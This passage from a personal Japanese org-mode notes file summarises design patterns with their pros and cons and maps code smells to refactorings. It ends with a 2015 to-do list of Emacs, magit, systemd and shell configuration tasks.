    + 頻繁なコードの変更が必要な部分を限定できる


    - Adaptor で提供されていない重要な振舞をクライアントが使
      えなくなることがある
    - アダプタを作らなくてもクラスのインターフェースを変更で
      きる場合には、設計が複雑になるだけである

** Bridge
*** 変更対応

    実装方法の変更に対応

** Mediator
*** 変更対応

    オブジェクト間の通信方法の変更に対応
** Iterator
   http://www.ogis-ri.co.jp/otc/hiroba/technical/DesignPatternsWithExample/chapter02.html

*** 変更対応

    コンテナクラスのアクセス方法の変更に対応
    - 例えば、 container の アクセスを reverse したければ
    "Reverse" class を作成する。
** Factory Method
   http://marupeke296.com/DP_FactoryMethod.html
   http://think-on-object.blogspot.jp/2011/11/factoryfactory-methodabstract-factory.html
   http://www.ogis-ri.co.jp/otc/hiroba/technical/DesignPatternsWithExample/chapter04.html

   オブジェクトを生成するために必要な知識が多くクラスに散在
   しているときは生成の散在がおきている。つまり、生成に関す
   る責務が、オブジェクトの生成にかかわるべきでないクラスに
   置かれいるということである。

   親クラスである Factory が、実際のオブジェクトの生成を SubClass に委譲する

*** 利点・欠点

    + オブジェクトを生成するステップが異ることが原因で生じて
      る重複が減る
    + どこで生成が行われているか、どのようにオーバーライドさ
      れているかが効果的に伝えられる
    + Factory Method で使うためにクラスがどの型を実装しなけ
      ればならないのかが明確になる
    + コンストラクタとの依存度をさげる。
    + interface に依存させる。
    + 生成ロジックとインスタンス化／設定のための情報とをまと
      める
    + クライアントを生成ロジックから切り離す

    - クラスの数が多くなる
    - 直接インスタンス化に比べて設計が複雑になる
    - Factory Method を実装するクラスに不必要な引数を渡さな
      ければならないことがある 


** Abstract Factory
*** 適用ケース
    http://marupeke296.com/DP_AbstractFactory.html

    Abstract Factory は、沢山のオブジェクトで構成される「固定的な」
    オブジェクトを生成するときに利用すると便利です。
    例えば、 RPG に出てくる主人公クラスのキャラクターについて、
    「剣」「鎧」「兜」「盾」というオブジェクトの組み合わせで
    「武具」が構成されるとき、これらを Abstract Factory でまとめておくと、
    別のキャラクタにはそれようのクラスを作れば独自のキャラクタをどんどん
    　 Windows Media Player などアプリケーションを着飾る「スキン」
    には Abstract Factory が使えます。スキンは、
    「外枠」「再生ボタン」「停止ボタン」など
    画面を構成する部品が厳格に決まっているので、 
    Abstract Factory が使いやすいでしょう。

*** 非適用ケース

    Abstract Factory は、構成オブジェクトの種類が増減する
    オブジェクトへは適用しにくいかと思います。
    さきほどの「武具」について、新しく「ガントレット」を
    追加したいと考えて、 Abstract Factory クラスへ
    それを追加した場合、派生するクラスすべてを更新する必要が出てきます。
    そういう追加を行う場合、元のクラスを変更するのではなく、ガン
    トレットは別の Abstract Factory クラスとして定義して使用するし
    かないでしょう。
*** 利点・欠点

    + 様々な種類のインスタンスの生成を、意図が明確なメソッド
      経由で行うことで単純化できる
    + 公開する必要のないクラスが隠蔽されるため、パッケージの
      「概念的重み」「 Bloch 」を減らすことができる
    + 「インターフェースにたいしてプログラミングするのであって、
      実装に対してプログラミングするのではない」「 DP 」という原理を厳
      しく適用できる

    - 新しい種類のインスタンスを生成しなければならない場合に
      は、 Creation Method の新規作成や変更が必要になる
    - Factroy のソースコードではなくバイナリコードにしかアク
      セスできない場合には、カスタマイズが制限される

** Template Method
   アルゴリズムの不変な部分をまず実装し、振舞が変わり得る部
   分の実装はサブクラスに残しておく場合に使用する。

*** 目的
    1 つオペレーションにアルゴリズムのスケルトンを定義してお
    き、その中のいくつかのステップについては、サブクラスでの
    定義に任せることにする。
    Template Method パターンでは、アルゴリズムの構造を変えず
    に、アルゴリズム中のあるステップをサブクラスで再定義する。

*** 利点・欠点
    + 不変な振舞をスーパークラスに移すことで、サブクラス間の重
      複したコードを取り除くことができる
    + 汎用のアルゴリズムのステップを簡潔にし、効果的に伝える
      ことができる
    + サブクラスで簡単にアルゴリズムをカスタマイズできるよう
      になる

    - アルゴリズムを肉付けするためにサブクラスで多くのメソッ
      ドを実装しなければならない場合には、設計が複雑になる

** Singleton

   あるクラスに対してインスタンスが１つしか存在しないことを
   保証し、それにアクセスするためのグルーバルな方法を提供す
   る。

** Facade
** Flyweight
** Interpreter
*** 利点・欠点
    + 言語要素の組み合わせを、暗黙的な言語よりもうまくサポー
      トできる
    + 言語要素の新しい組み合わせをサポートするのにコードを追
      加する必要がない
    + 振舞を実行時に設定できる
      
    - 文法を定義し、それを使うようクライアントコードを変更す
      るという初期コストが伴う

    - 言語が複雑な場合には膨大なプログラミングが必要になる
    - 言語が単純な場合には設計が複雑になるだけである

** Observer
   http://www.ogis-ri.co.jp/otc/hiroba/technical/DesignPatternsWithExample/chapter05.html

   Push
   Pull

*** 利点・欠点
    + 観察対象と観察者との間の結合度が低くなる
    + 観察者が単数の場合にも複数の場合にも対処できる
    
    - ハードコーディングされた通知で用が足りる場合には、設計
      が複雑になる
    - 通知がカスケードしている場合には、設計が複雑になる
    - 観察対象から観察者が削除されないと、メモリーリークが起
      きる可能性がある

** Memento
** Proxy
** Decorator
** Command
*** 利点・欠点
    + 一律に同じやり方で、さまざまな振舞を実行するためのシン
      プルなメカニズムである
    + どのリクエストをどのように処理するかは実行時に変更でき
      る
    + 実装するためのコードが少ししか必要でない
      
    - 条件つき ディスパッチャで用が足りる場合には、設計が複雑
      になるだけである

** Chain
** Builder
   Builder のインターフェースは、誰が見てもすぐわかるように、
   明確に意図が伝わるものでなければならない。

*** 利点・欠点
    + Composite を構築するクライアントコードを単純化できる
    + Composite の生成にまつわる繰返しやエラーを軽減できる
    + クライアントと Composite の間の結合度が低くなる
    + カプセル化された Composite や複合オブジェクトを異った形
      式で表現できる

    - インターフェースの意図が伝わりにくくなる可能性がある
    - Builder の提供する機能を完全に理解するには、 Builder の
      実装を見たり、テストコードやドキュメントを読んだりする
      必要があるかもしれない。 

** Visitor
** Composite
*** 利点・欠点
    + ノードの形成、追加、削除といった手順の繰返しをカブセル
      化できる
    + 同じようなロジックの増殖に対処する汎用的な方法となる
    + クライアントの構築作業が簡単になる
    + 子に関する格納と処理の両ロジックの重複をなくすことがで
      きる
    + 子を処理するロジックを継承できることが効果的に伝わる
     
    - 暗黙的なツリー構造を作成するほうが簡単な場合には、設計
      が複雑になるだけである
      
* 逆引 Design Pattern
** 重複したコード
   - Template Method の形成
   - Factory Method によるポリモーフィックな生成の導入
   - コンストラクタの連鎖
   - Composite による単数、複数別の処理の置き換え
   - Composite の抽出
   - Adapter によるインターフェースの統合
   - Null オブジェクトの導入

** 長過るメソッド
   - メソッドの構造化
   - Collecting Parameter による累積処理の書き換え
   - Command による条件つきディスパッチャの置き換え
   - Visitor による累積処理の書き換え
   - Strategy による条件判断の置き換え

** 複雑な条件記述
   - Strategy による条件判断の置き換え
   - Decorator による拡張機能の書き換え
   - State による状態変化のための条件判断の置き換え
   - Null オブジェクトの導入

** 基本データ型への執着
   - クラスによるタイプコードの置き換え
   - State による状態変化のための条件判断の置き換え
   - Strategy による条件判断の置き換え
   - Composite による暗黙的なツリー構造の置き換え
   - Interpreter による暗黙的な言語処理の置き換え
   - Decorator による拡張機能の書き換え
   - Builder による Composite の隠蔽

** 見苦しい露出
   - Factory によるクラス群の隠蔽

** 解決策の散在
   - Factory による生成処理の書き換え

** クラスのインンターフェース不一致
   - Adapter によるインターフェースの統合

** 怠け者クラス
   - Singleton のインライン化

** 巨大なクラス
   - Command による条件つきディスパッチャの置き換え
   - State による状態変化のための条件判断の置き換え
   - Interpreter による暗黙的な言語処理の置き換え

** スイッチ文
   - Command による条件つきティスパッチャの置き換え
   - Visitor による累積処理の書き換え
     
** 組み合わせの爆発的増加
   - Interpreter による暗黙的な言語処理の置き換え

** 風変わりな解決策
   - Adapter によるインターフェースの統合
* ----- DOING -----
** TODO remove python-mode
  <2015-10-05 Mon 05:57>
** TODO magit perspective
  <2015-10-05 Mon 05:57>
** WAIT python daily v2c Popen
  <2015-10-02 Fri 21:21>
** TODO fix woman
  <2015-10-02 Fri 13:42>
** TODO fix dmacro
  <2015-10-02 Fri 13:15>
** TODO .zsh history merge
   <2015-10-02 Fri 12:35>
** DONE doing to allinone.org
   CLOSED: [2015-10-02 Fri 22:36]
   <2015-10-02 Fri 12:34>
** TODO systemd ssh tunnel
   <2015-10-02 Fri 12:33>
** TODO auto construct dotfile from king server 
   <2015-10-02 Fri 12:32>
** TODO emacs package make minimize
   <2015-10-02 Fri 12:22>
** TODO multi-term zsh 表示問題
   bash を使うと正しく表示される。
   <2015-10-02 Fri 12:21>
** TODO disable view mode on magit commit buffer
   <2015-10-02 Fri 11:48>
** TODO magit keybind C-j move left
   <2015-10-02 Fri 11:47>
** TODO insert commit template
   <2015-10-02 Fri 11:45>
** TODO python elisp_compileall.py wait close all process
   <2015-10-02 Fri 10:59>
** TODO .emacs.d if not exists 06_loaddefs_start.el call constract_loaddef function
   <2015-10-02 Fri 10:58>
** TODO org-todo rotate sequence TODO => DONE => LATER
   <2015-10-02 Fri 10:16>
** TODO make function some-buffer-save-kill
   <2015-10-02 Fri 08:30>
** TODO pymacs package manage by el-get
   <2015-09-30 Wed 12:59>
** TODO lock desktop
   <2015-09-28 Mon 02:34>
** TODO kernel crash dump
   <2015-09-27 Sun 02:00>
** TODO subversion to git
   <2015-09-27 Sun 00:47>
** TODO upgrade python3
   <2015-09-26 Sat 11:09>
** TODO king kernel config
   <2015-09-26 Sat 11:07>
** TODO recover usb linux
   <2015-09-26 Sat 11:07>
** TODO text translator one search engine
   <2015-09-13 Sun 23:50>
** TODO king auto halt "halt" to "poweroff"
   <2015-09-12 Sat 03:15>
** TODO systemd bluetooth device detected to active bluetooth
   <2015-09-11 Fri 05:04>
** TODO remove tty63
   <2015-09-11 Fri 03:48>
** TODO mac addr change at network interface connected
   <2015-09-11 Fri 03:48>
** TODO remove "wellcom kali linux on boot"
   <2015-09-11 Fri 03:47>
** TODO xahk
   <2015-08-30 Sun 17:43>
** TODO 多重起動防止
   <2015-08-30 Sun 11:58>
** TODO bus timetable watch dog for monthly
   <2015-08-19 Wed 08:30>
** TODO exception_hook_pdb
   <2015-08-07 Fri 09:53>
** TODO all recipe package to one
   <2015-08-07 Fri 00:57>
** TODO seikyo 最安値 excel 化
   <2015-08-06 Thu 21:26>
** TODO autohalt.py to king/fordeamon
   <2015-08-06 Thu 07:41>
** TODO king server connection object
   mirroring object
   <2015-08-06 Thu 07:13>
** TODO oil price calculate in japan 
   <2015-08-06 Thu 02:50>
** TODO yearly
   <2015-08-06 Thu 02:27>
** TODO 4monthly
   <2015-08-06 Thu 02:26>
** TODO monthly
   <2015-08-06 Thu 02:26>
** TODO currency exchange show daily
   <2015-08-06 Thu 02:14>
** TODO create chrome object
   <2015-08-05 Wed 22:41>
** POSTPONES sleipnir copy url and open chrome
   <2015-08-05 Wed 23:04>
